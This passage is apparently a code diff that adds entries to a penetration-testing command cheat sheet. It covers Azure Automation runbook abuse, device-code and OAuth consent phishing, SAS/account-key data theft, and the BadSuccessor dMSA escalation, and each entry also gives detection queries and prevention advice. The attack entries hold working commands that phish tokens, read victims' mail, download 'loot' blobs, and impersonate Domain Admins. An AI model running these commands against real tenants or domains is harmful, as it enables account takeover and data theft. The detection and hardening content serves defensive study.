+          "label": "Dump stored variables/credentials",
+          "command": "az automation variable list --automation-account-name <target> -g <share>"
+        },
+        {
+          "label": "Start a planted runbook",
+          "command": "az automation runbook start --automation-account-name <target> -g <share> --name <profile>"
+        }
+      ],
+      "references": [
+        {
+          "title": "NetSPI - Attacking Azure Automation Accounts",
+          "url": "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/maintaining-azure-persistence-via-automation-accounts/"
+        },
+        {
+          "title": "Microsoft docs - Managed identities for Automation",
+          "url": "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "azure-managed-identity-token",
+          "note": "The runbook mints the managed-identity token used here.",
+          "rel": "prereq"
+        },
+        {
+          "id": "azure-arm-enum",
+          "note": "Enumerate Automation Accounts and their RBAC roles.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-microburst",
+          "note": "MicroBurst automates Automation Account cred extraction.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Automation runbooks are designed to run code under an attached identity. If that managed identity or legacy RunAs SP holds broad RBAC (often Contributor), anyone who can create, edit, or start a runbook can execute arbitrary code as that privileged identity and read the account's stored secrets.",
+        "prerequisites": "Write/contributor rights over the Automation Account (create/replace/publish/start runbooks); an attached managed identity or RunAs SP with meaningful RBAC roles.",
+        "impact": "Privilege escalation to the managed identity's roles (potentially subscription Contributor), theft of stored variables/credentials/connections and Key Vault secrets it can reach, and durable persistence via scheduled runbooks or webhooks.",
+        "detection": "[MITRE T1651] Azure Activity log operations on runbooks (write/publish/start) from unusual principals; Automation job logs showing unexpected scripts; managed-identity token requests followed by role-assignment or Key Vault access it does not normally perform.",
+        "artifacts": "AzureActivity 'Microsoft.Automation/automationAccounts/runbooks/write|publish|start', Automation job streams/output, new role assignments by the Automation identity, Key Vault AuditEvent access from the Automation SP.",
+        "splunk_spl": "index=azure sourcetype=azure:activity operationNameValue=\"MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/*\"\n| stats count values(operationNameValue) as ops by caller, resourceId, callerIpAddress",
+        "elastic_kql": "azure.activitylogs.operation_name:(*Automation*runbooks*write* or *Automation*runbooks*publish* or *Automation*runbooks*start*)",
+        "sentinel_kql": "AzureActivity\n| where OperationNameValue has \"AUTOMATIONACCOUNTS/RUNBOOKS\"\n| where OperationNameValue has_any (\"WRITE\",\"PUBLISH\",\"START\")\n| summarize Count=count(), Ops=make_set(OperationNameValue) by Caller, _ResourceId, CallerIpAddress",
+        "sigma_rules": "azure_automation_runbook_abuse",
+        "prevention": "Grant Automation managed identities least-privilege RBAC (never subscription Contributor); restrict who can write/publish/start runbooks; disable legacy RunAs accounts; store secrets in Key Vault with tight access rather than Automation variables; enable Automation diagnostic logs and alert on runbook writes/starts by non-automation principals.",
+        "sources": [
+          "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/maintaining-azure-persistence-via-automation-accounts/",
+          "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Automation runbook created/published/started by unusual principal",
+            "logic": "AzureActivity\n| where OperationNameValue has \"AUTOMATIONACCOUNTS/RUNBOOKS\" and OperationNameValue has_any (\"WRITE\",\"PUBLISH\",\"START\")\n| summarize Count=count(), Ops=make_set(OperationNameValue) by Caller, _ResourceId, CallerIpAddress",
+            "data_source": "azure-activity",
+            "attack": [
+              "T1651",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate automation authors and CI/CD updating runbooks",
+            "tuning": "Allowlist known runbook authors/service principals; alert on runbook writes/starts from interactive human accounts or new IPs"
+          }
+        ]
+      }
+    },
+    {
+      "id": "azure-device-code-phishing",
+      "name": "Azure Device-Code Phishing - Capture Entra Tokens",
+      "command": "az login --use-device-code",
+      "description": "Abuse the OAuth 2.0 device-authorization flow to phish Entra ID (Azure AD) tokens. The attacker requests a device code against a first-party client, sends the victim the real https://microsoft.com/devicelogin page and a user_code, and when the victim authenticates (passing MFA), the attacker polls the token endpoint and receives the victim's access and refresh tokens - no password or credential ever touches the attacker.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "o365blog / TokenTactics",
+      "tags": [
+        "azure",
+        "entra-id",
+        "device-code",
+        "phishing",
+        "oauth",
+        "token",
+        "mfa-bypass"
+      ],
+      "mitre": [
+        "T1528",
+        "T1078.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  The device-code flow is meant for input-constrained devices. The victim\n  authenticates on the genuine Microsoft page, so MFA and the real URL both\n  look legitimate; the attacker just harvests the resulting tokens.\n\n=== STEP 1: REQUEST A DEVICE CODE (attacker) ===\n  # first-party client id (Azure CLI shown); FOCI clients give broad refresh tokens\n  curl -s -X POST \\\n    'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \\\n    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \\\n    -d 'scope=https://graph.microsoft.com/.default offline_access'\n  # returns device_code, user_code, verification_uri, interval\n\n=== STEP 2: LURE (send to victim) ===\n  \"Go to https://microsoft.com/devicelogin and enter code: <user_code>\"\n\n=== STEP 3: POLL FOR TOKENS (attacker) ===\n  curl -s -X POST \\\n    'https://login.microsoftonline.com/common/oauth2/v2.0/token' \\\n    -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \\\n    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \\\n    -d 'device_code=<device_code>'\n  # once the victim signs in: access_token + refresh_token returned\n\n=== EASIER WITH TOOLING ===\n  # TokenTactics (PowerShell)\n  Import-Module .\\TokenTactics.ps1\n  Get-AzureToken -Client MSGraph           # starts a device-code request\n  # az CLI (your own login, or to show the flow):\n  az login --use-device-code\n\n=== USE THE TOKENS ===\n  Refresh token -> mint tokens for Graph, ARM, Exchange, etc.\n  Pass to AADInternals / GraphRunner / ROADtools for post-exploitation.",
+      "examples": [
+        {
+          "label": "Request a device code (Azure CLI client)",
+          "command": "curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' -d 'scope=https://graph.microsoft.com/.default offline_access'"
+        },
+        {
+          "label": "Poll token endpoint after victim signs in",
+          "command": "curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' -d 'device_code=<device_code>'"
+        },
+        {
+          "label": "Device-code login with TokenTactics",
+          "command": "Get-AzureToken -Client MSGraph"
+        }
+      ],
+      "references": [
+        {
+          "title": "o365blog - Introducing a new phishing technique (device code)",
+          "url": "https://aadinternals.com/post/phishing/"
+        },
+        {
+          "title": "Microsoft docs - OAuth 2.0 device authorization grant",
+          "url": "https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-tokentactics",
+          "note": "TokenTactics automates the device-code request and polling.",
+          "rel": "next"
+        },
+        {
+          "id": "azure-managed-identity-token",
+          "note": "Token-based access is the broader primitive.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-aadinternals",
+          "note": "Use captured tokens for Entra post-exploitation.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The device-code grant lets any client start an authentication the victim completes on the genuine Microsoft sign-in page. Because the victim sees a real URL and satisfies MFA normally, the phish is convincing, and the attacker receives valid access and refresh tokens without ever handling a credential.",
+        "prerequisites": "A public client_id (first-party IDs work and often need no consent), network access to login.microsoftonline.com, and a victim willing to enter the user_code on the device-login page within the code's validity window.",
+        "impact": "Theft of valid Entra access and refresh tokens, including FOCI refresh tokens that mint tokens for many first-party resources - effectively account takeover that already passed MFA.",
+        "detection": "[MITRE T1528] Entra sign-in logs with authenticationProtocol=deviceCode, especially where the sign-in IP/device differs from where tokens are later used; device-code sign-ins to Azure CLI / other first-party clients the user does not normally use.",
+        "artifacts": "Entra ID SigninLogs events with AuthenticationProtocol=deviceCode; subsequent token use from a different IP/ASN than the interactive sign-in; unusual appId (e.g. Azure CLI 04b07795-...).",
+        "splunk_spl": "index=azure sourcetype=azure:aad:signin authenticationProtocol=deviceCode\n| stats count values(appDisplayName) by userPrincipalName, ipAddress\n| where count>0",
+        "elastic_kql": "azure.signinlogs.properties.authentication_protocol:\"deviceCode\"",
+        "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol == \"deviceCode\"\n| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName",
+        "sigma_rules": "azure_device_code_authentication",
+        "prevention": "Block the device-code flow with a Conditional Access authentication-flows policy except for the few device types that need it; require compliant/managed devices; user-train against entering codes they did not initiate; alert on any deviceCode sign-in and on token use from a new IP shortly after.",
+        "sources": [
+          "https://aadinternals.com/post/phishing/",
+          "https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Entra device-code authentication (phishing)",
+            "logic": "SigninLogs\n| where AuthenticationProtocol == \"deviceCode\"\n| summarize Count=count(), IPs=make_set(IPAddress), Apps=make_set(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)",
+            "data_source": "entra-id",
+            "attack": [
+              "T1528",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate device-code use on input-constrained devices (smart TVs, IoT, some CLI logins)",
+            "tuning": "Allowlist expected device-code client IDs/users; alert on new UPNs and on tokens later used from a different IP"
+          }
+        ]
+      }
+    },
+    {
+      "id": "azure-illicit-consent-grant",
+      "name": "Azure Illicit Consent Grant - OAuth App Phishing",
+      "command": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<client_id>&response_type=code&scope=<scope>",
+      "description": "Register a multi-tenant Entra application and trick a victim into granting it delegated Microsoft Graph permissions (Mail.Read, Files.Read.All, offline_access, etc.) via the real OAuth consent screen. Once consented, the attacker's app holds a refresh token and persistent delegated access to the victim's mailbox/files - independent of the victim's password and surviving password resets.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "Microsoft Security / o365blog",
+      "tags": [
+        "azure",
+        "entra-id",
+        "oauth",
+        "consent-phishing",
+        "illicit-consent",
+        "graph",
+        "persistence"
+      ],
+      "mitre": [
+        "T1528",
+        "T1098.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\n  You don't steal a password. You get the victim to consent to YOUR app,\n  which then has a refresh token for the scopes they approved. Access\n  persists until an admin revokes the grant / disables the app.\n\n=== STEP 1: REGISTER A MULTI-TENANT APP ===\n  az ad app create --display-name \"HR Portal\" \\\n    --sign-in-audience AzureADMultipleOrgs \\\n    --web-redirect-uris https://<attacker_host>/callback\n  # add delegated Graph permissions: Mail.Read, Files.Read.All, offline_access\n  az ad app permission add --id <app_id> \\\n    --api 00000003-0000-0000-c000-000000000000 \\\n    --api-permissions <permission_guid>=Scope\n\n=== STEP 2: SEND THE CONSENT LINK (lure) ===\n  https://login.microsoftonline.com/common/oauth2/v2.0/authorize?\n    client_id=<client_id>&response_type=code\n    &redirect_uri=https://<attacker_host>/callback\n    &scope=offline_access%20Mail.Read%20Files.Read.All\n    &state=1\n  # victim clicks, sees the real Microsoft consent page, clicks Accept\n\n=== STEP 3: EXCHANGE CODE FOR TOKENS (attacker callback) ===\n  curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \\\n    -d 'client_id=<client_id>' -d 'client_secret=<secret>' \\\n    -d 'grant_type=authorization_code' -d 'code=<code>' \\\n    -d 'redirect_uri=https://<attacker_host>/callback'\n  # returns access_token + refresh_token for the consented scopes\n\n=== STEP 4: USE DELEGATED GRAPH ACCESS ===\n  curl -H \"Authorization: Bearer <access_token>\" \\\n    https://graph.microsoft.com/v1.0/me/messages\n\n=== TOOLING ===\n  o365-attack-toolkit, GraphRunner (Invoke-InjectOAuthApp), 365-Stealer.",
+      "examples": [
+        {
+          "label": "Register a multi-tenant app",
+          "command": "az ad app create --display-name 'HR Portal' --sign-in-audience AzureADMultipleOrgs --web-redirect-uris https://<url>/callback"
+        },
+        {
+          "label": "Consent URL (lure)",
+          "command": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<client_id>&response_type=code&redirect_uri=https://<url>/callback&scope=offline_access%20Mail.Read"
+        },
+        {
+          "label": "Read victim mail with the token",
+          "command": "curl -H 'Authorization: Bearer <token>' https://graph.microsoft.com/v1.0/me/messages"
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft - Illicit consent grant attack",
+          "url": "https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants"
+        },
+        {
+          "title": "o365blog - OAuth consent phishing",
+          "url": "https://aadinternals.com/post/phishing/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-graphrunner",
+          "note": "GraphRunner injects malicious OAuth apps and uses the tokens.",
+          "rel": "next"
+        },
+        {
+          "id": "azure-device-code-phishing",
+          "note": "Alternative token-phishing technique.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-aadinternals",
+          "note": "Post-consent Entra/Graph post-exploitation.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "User consent to third-party OAuth apps is a supported feature. If the tenant allows users to consent to apps (or consent is phished from an admin), a victim can grant a rogue multi-tenant app delegated Graph scopes, giving the attacker a refresh token and standing access independent of the password.",
+        "prerequisites": "A registered multi-tenant Entra app with a secret and a redirect URI, requested delegated scopes, and a victim who clicks Accept on the consent screen (or an admin who grants tenant-wide consent).",
+        "impact": "Persistent delegated access to the victim's mail, files, and other Graph data; the refresh token survives password resets, so remediation requires revoking the grant and the app - true persistence.",
+        "detection": "[MITRE T1098.003] Entra audit log 'Consent to application' / 'Add OAuth2PermissionGrant' / 'Add app role assignment' events, especially for unfamiliar multi-tenant apps requesting sensitive scopes (Mail.Read, Files.Read.All, offline_access).",
+        "artifacts": "Entra AuditLogs operations 'Consent to application' and 'Add delegated permission grant'; ServicePrincipal and OAuth2PermissionGrant objects for the rogue app; Graph API access from the app's service principal.",
+        "splunk_spl": "index=azure sourcetype=azure:aad:audit (operationName=\"Consent to application\" OR operationName=\"Add OAuth2PermissionGrant\" OR operationName=\"Add delegated permission grant to*\")\n| stats count by initiatedBy.user.userPrincipalName, targetResources{}.displayName",
+        "elastic_kql": "azure.auditlogs.operation_name:(\"Consent to application\" or \"Add OAuth2PermissionGrant\")",
+        "sentinel_kql": "AuditLogs\n| where OperationName in (\"Consent to application\",\"Add OAuth2PermissionGrant\",\"Add delegated permission grant to service principal\")\n| project TimeGenerated, InitiatedBy, OperationName, TargetResources",
+        "sigma_rules": "azure_illicit_oauth_consent_grant",
+        "prevention": "Disable user consent to apps and require admin consent (with an admin-consent request workflow); restrict consent to verified publishers and low-risk scopes; enable Entra app consent policies; review enterprise-app consent grants regularly; alert on new OAuth grants for sensitive scopes.",
+        "sources": [
+          "https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants",
+          "https://aadinternals.com/post/phishing/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Illicit OAuth consent grant for sensitive scopes",
+            "logic": "AuditLogs\n| where OperationName in (\"Consent to application\",\"Add OAuth2PermissionGrant\",\"Add delegated permission grant to service principal\")\n| mv-expand TargetResources\n| extend App=tostring(TargetResources.displayName)\n| project TimeGenerated, InitiatedBy, OperationName, App",
+            "data_source": "entra-id",
+            "attack": [
+              "T1528",
+              "T1098.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate onboarding of new SaaS/line-of-business apps",
+            "tuning": "Allowlist approved publishers/apps; alert on consent to multi-tenant apps requesting Mail/Files/offline_access scopes"
+          }
+        ]
+      }
     },
     {
       "id": "azure-managed-identity-token",
@@ -15030,6 +16225,110 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Enumerates the Azure Resource Manager layer with the az CLI:\n  az resource list -o table   list every resource your principal can see\nThe card walks accounts/subscriptions (az account list), resource groups (az group list), and - most importantly - RBAC via 'az role assignment list --all' and role definitions to find what you can do and where to escalate."
+    },
+    {
+      "id": "azure-storage-sas-abuse",
+      "name": "Azure Storage - SAS Token & Account Key Abuse",
+      "command": "az storage blob list --account-name <target> --sas-token <token> --container-name <share>",
+      "description": "Abuse over-permissive Azure Storage access: leaked account keys (full control of a storage account), overly broad or long-lived SAS tokens, and anonymously readable blob containers. These let an attacker read and often write blobs, exfiltrate data, or plant malicious content - and account keys cannot be scoped or easily revoked without rotation that breaks every consumer.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "Microsoft docs / hackingthe.cloud",
+      "tags": [
+        "azure",
+        "storage",
+        "blob",
+        "sas-token",
+        "account-key",
+        "anonymous-access",
+        "exfiltration"
+      ],
+      "mitre": [
+        "T1552.005",
+        "T1530"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THREE ABUSE PATHS ===\n  1. Account key  -> full read/write/delete of the whole storage account.\n  2. SAS token    -> scoped URL; but over-broad (rwdlacup) or long-lived SAS\n                     still grants wide access if leaked.\n  3. Anonymous    -> containers set to public Blob/Container access need no auth.\n\n=== ANONYMOUS CONTAINER (no creds) ===\n  curl 'https://<target>.blob.core.windows.net/<share>?restype=container&comp=list'\n  az storage blob list --account-name <target> --container-name <share> --auth-mode login\n\n=== WITH A SAS TOKEN ===\n  az storage blob list --account-name <target> \\\n    --container-name <share> --sas-token '<token>'\n  az storage blob download --account-name <target> --container-name <share> \\\n    --name secret.txt --file loot.txt --sas-token '<token>'\n\n=== WITH AN ACCOUNT KEY (full control) ===\n  az storage account keys list --account-name <target> -g <rg>   # if you can read keys\n  az storage container list --account-name <target> --account-key <token>\n  az storage blob upload --account-name <target> --account-key <token> \\\n    --container-name <share> --name payload.html --file payload.html\n\n=== INSPECT / FORGE SAS (with a key) ===\n  az storage container generate-sas --account-name <target> \\\n    --name <share> --permissions rwdl --account-key <token> \\\n    --expiry 2030-01-01\n\n=== FIND LEAKS ===\n  SAS URLs leak in code, git history, config, Logic Apps, emails.",
+      "examples": [
+        {
+          "label": "List an anonymously-readable container",
+          "command": "curl 'https://<target>.blob.core.windows.net/<share>?restype=container&comp=list'"
+        },
+        {
+          "label": "Download a blob with a SAS token",
+          "command": "az storage blob download --account-name <target> --container-name <share> --name secret.txt --file loot.txt --sas-token '<token>'"
+        },
+        {
+          "label": "Forge a long-lived SAS with an account key",
+          "command": "az storage container generate-sas --account-name <target> --name <share> --permissions rwdl --account-key <token> --expiry 2030-01-01"
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft docs - Grant limited access with SAS",
+          "url": "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview"
+        },
+        {
+          "title": "hackingthe.cloud - Azure storage account abuse",
+          "url": "https://hackingthe.cloud/azure/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-microburst",
+          "note": "MicroBurst enumerates storage accounts and public blobs.",
+          "rel": "prereq"
+        },
+        {
+          "id": "azure-arm-enum",
+          "note": "ARM enumeration to find storage accounts and keys.",
+          "rel": "prereq"
+        },
+        {
+          "id": "azure-managed-identity-token",
+          "note": "A managed identity may hold Storage data-plane roles.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Account keys grant unscoped full control and are shared static secrets; SAS tokens are bearer URLs that work for anyone who holds them until expiry; anonymous access serves blobs with no authentication. Over-broad configuration of any of these turns a leaked string or a public setting into data access.",
+        "prerequisites": "A leaked account key or SAS token, or a container configured for anonymous Blob/Container public access; for forging SAS, possession of (or the ability to list) an account key.",
+        "impact": "Read/write/delete of blob data - exfiltration of sensitive files, tampering with served content (e.g. static sites, scripts), and in the account-key case full control over the storage account.",
+        "detection": "[MITRE T1530] Storage diagnostic/StorageRead-StorageWrite logs showing access via SAS (authenticationType=SAS) or account key from unexpected IPs; anonymous (AnonymousSuccess) reads; az storage account keys list in Azure Activity; blob access from new ASNs.",
+        "artifacts": "Azure Monitor StorageBlobLogs (AuthenticationType, CallerIpAddress, Uri), Azure Activity 'List Storage Account Keys' operation, diagnostic settings showing anonymous success.",
+        "splunk_spl": "index=azure sourcetype=azure:activity operationName=\"*listKeys*\" OR operationNameValue=\"MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION\"\n| stats count by caller, resourceId, callerIpAddress",
+        "elastic_kql": "azure.activitylogs.operation_name:\"*listKeys*\" or azure.storage.authentication_type:\"SAS\"",
+        "sentinel_kql": "StorageBlobLogs\n| where AuthenticationType in (\"SAS\",\"Anonymous\")\n| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType\n| union (AzureActivity | where OperationNameValue has \"listKeys\")",
+        "sigma_rules": "azure_storage_sas_or_key_abuse",
+        "prevention": "Disable anonymous blob access at the account level; disable shared-key authorization and use Entra ID (RBAC) for the data plane; if SAS is required use short-lived user-delegation SAS with minimal permissions and a stored access policy for revocation; rotate account keys and store none in code; enable storage logging and alert on key listing and anonymous access.",
+        "sources": [
+          "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview",
+          "https://hackingthe.cloud/azure/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Storage access via SAS/anonymous or account-key listing",
+            "logic": "StorageBlobLogs\n| where AuthenticationType in (\"SAS\",\"Anonymous\")\n| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType\n| where Count > 50",
+            "data_source": "azure-activity",
+            "attack": [
+              "T1530",
+              "T1552.005"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate apps/CDNs that use SAS or public containers for distribution",
+            "tuning": "Baseline expected SAS caller IPs and public containers; alert on new IPs/ASNs and on any listKeys outside change windows"
+          }
+        ]
+      }
     },
     {
       "id": "cloud-azurehound",
@@ -15564,6 +16863,112 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Extracts the AD database on a DC using SeBackupPrivilege plus a shadow copy:\n  diskshadow.exe           script a Volume Shadow Copy of C: (works around the NTDS lock)\nThen Copy-FileSeBackupPrivilege the NTDS.dit off the snapshot and reg save the SYSTEM hive; run impacket-secretsdump -ntds -system LOCAL to dump every domain hash offline. Backup Operators on a DC = domain compromise."
+    },
+    {
+      "id": "ad-dmsa-badsuccessor",
+      "name": "BadSuccessor - delegated MSA (dMSA) Migration Abuse",
+      "command": "Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}",
+      "description": "BadSuccessor (Akamai, 2025) abuses the delegated Managed Service Account (dMSA) migration feature on Windows Server 2025 domain controllers. By creating a dMSA and setting its msDS-ManagedAccountPrecededByLink to any target principal (and marking the migration completed), the dMSA is treated as the successor of that principal: the KDC issues it a PAC containing the victim's SIDs, so it inherits the victim's privileges and can obtain the victim's keys - effectively any user, including Domain Admins. Only the right to create/control a dMSA object in an OU is required.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "Akamai BadSuccessor research (CVE-2025)",
+      "tags": [
+        "dmsa",
+        "badsuccessor",
+        "server-2025",
+        "privilege-escalation",
+        "account-manipulation",
+        "kerberos",
+        "msDS-ManagedAccountPrecededByLink"
+      ],
+      "mitre": [
+        "T1098",
+        "T1078.002"
+      ],
+      "exam": "lab-only",
+      "notes": "=== PREREQUISITES ===\n  # - At least one Windows Server 2025 DC (dMSA feature present).\n  # - CreateChild on dMSA objects in an OU (or write over an existing dMSA).\n  #   This OU-level right is common and is NOT a classic DA/privileged right.\n\n=== CREATE A dMSA + LINK IT TO THE VICTIM ===\n  # Create the dMSA object (RSAT / AD module):\n  New-ADServiceAccount -Name <target_account> -DNSHostName <dc_host> -Path \"<ou_dn>\" -KerberosEncryptionType AES256\n  # Point it at the victim and mark migration as completed:\n  Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}\n  Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-DelegatedMSAState\"=2}\n  # (BloodyAD can set the same attributes from Linux - see recommended.)\n\n=== OBTAIN THE SUCCESSOR TICKET (inherits victim SIDs) ===\n  # Rubeus requests a TGT for the dMSA; the KDC embeds the victim's SIDs in the PAC\n  # and returns the key material for impersonation:\n  Rubeus.exe asktgs /targetuser:<target_account> /service:krbtgt/<domain> /dmsa /opsec /nowrap\n  # Use the resulting ticket as the victim (DA) for DCSync / admin access.\n\n=== DETECT YOUR OWN FOOTPRINT ===\n  # The link attribute and dMSA state are the key indicators (see defense).\n\n=== ALTERNATIVES ===\n  ad-shadow-credentials       # key-material impersonation via msDS-KeyCredentialLink\n  Classic RBCD / S4U          # delegation-based impersonation",
+      "examples": [
+        {
+          "label": "Link the dMSA to a privileged victim",
+          "command": "Set-ADServiceAccount -Identity <target_account> -Replace @{\"msDS-ManagedAccountPrecededByLink\"=\"<victim_dn>\"}"
+        },
+        {
+          "label": "Create the dMSA in a writable OU",
+          "command": "New-ADServiceAccount -Name <target_account> -DNSHostName <dc_host> -Path \"<ou_dn>\" -KerberosEncryptionType AES256"
+        },
+        {
+          "label": "Request the successor TGT with Rubeus",
+          "command": "Rubeus.exe asktgs /targetuser:<target_account> /service:krbtgt/<domain> /dmsa /opsec /nowrap"
+        }
+      ],
+      "references": [
+        {
+          "title": "Akamai - BadSuccessor: Abusing dMSA",
+          "url": "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory"
+        },
+        {
+          "title": "MITRE T1098 - Account Manipulation",
+          "url": "https://attack.mitre.org/techniques/T1098/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-bloodyad-toolkit",
+          "note": "BloodyAD can set the dMSA link attributes from Linux.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-shadow-credentials",
+          "note": "Parallel key-material impersonation primitive.",
+          "rel": "alternative"
+        },
+        {
+          "id": "secretsdump-ntds",
+          "note": "DCSync/dump once you impersonate a Domain Admin.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The Server 2025 dMSA migration feature trusts msDS-ManagedAccountPrecededByLink (with msDS-DelegatedMSAState set to completed) to mean the dMSA legitimately succeeds the linked principal, so the KDC builds the dMSA's PAC from the predecessor's SIDs and provides key material. The only requirement is the ability to create or control a dMSA object in an OU - an often-delegated right that is not treated as privileged.",
+        "prerequisites": "At least one Windows Server 2025 DC and CreateChild/write rights over a dMSA object in some OU. No prior Domain Admin or classic privileged access is needed.",
+        "impact": "Impersonation of any principal including Domain Admins, inheriting their SIDs and keys - full domain compromise from a low-privileged OU delegation.",
+        "detection": "[MITRE T1098] Creation of a dMSA object (4741/5137) followed by writes to msDS-ManagedAccountPrecededByLink and msDS-DelegatedMSAState; Kerberos TGT requests for a new dMSA that resolve to privileged SIDs; dMSA activity from accounts that never administer service accounts.",
+        "artifacts": "Directory service object creation (5137) for msDS-DelegatedManagedServiceAccount; 5136 attribute modifications of msDS-ManagedAccountPrecededByLink; 4741 computer/service account creation; 4769 ticket requests for the dMSA.",
+        "splunk_spl": "index=windows (EventCode=5137 OR EventCode=5136) (Attribute_LDAP_Display_Name=\"msDS-ManagedAccountPrecededByLink\" OR Class=\"msDS-DelegatedManagedServiceAccount\")\n| stats values(Attribute_Value) by Account_Name, ObjectDN, _time",
+        "elastic_kql": "event.code:(\"5136\" or \"5137\") and winlog.event_data.AttributeLDAPDisplayName:\"msDS-ManagedAccountPrecededByLink\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID in (5136, 5137)\n| where ObjectClass == \"msDS-DelegatedManagedServiceAccount\" or AttributeLDAPDisplayName == \"msDS-ManagedAccountPrecededByLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "sigma_rules": "win_ad_dmsa_badsuccessor_link_write",
+        "prevention": "Audit and tightly restrict who can create dMSA objects (CreateChild on msDS-DelegatedManagedServiceAccount) in every OU; monitor and alert on writes to msDS-ManagedAccountPrecededByLink and msDS-DelegatedMSAState; apply Microsoft's dMSA hardening/patches; keep DA/Tier 0 objects out of OUs with broad create delegations.",
+        "sources": [
+          "https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory",
+          "https://attack.mitre.org/techniques/T1098/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "dMSA linked to a predecessor principal (BadSuccessor)",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-ManagedAccountPrecededByLink\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeValue",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1098"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
